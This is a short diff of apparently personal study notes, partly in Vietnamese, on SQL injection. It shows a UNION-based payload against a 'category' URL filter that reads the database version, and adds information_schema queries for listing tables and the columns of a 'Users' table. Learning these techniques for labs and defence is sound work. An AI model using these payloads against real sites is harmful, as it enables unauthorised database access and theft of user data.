@@ -86,3 +86,13 @@ cột, sau đó truy vấn như bình thường, truy vấn cho csdl sẽ chiế
 .../filter?category=Pets' union select @@version, @@version-- -
 
 
+Listing the contents of the database
+to list the tables in the database: SELECT * FROM information_schema.tables
+to list the columns in individual tables: SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+
+
+
+
+
+
+
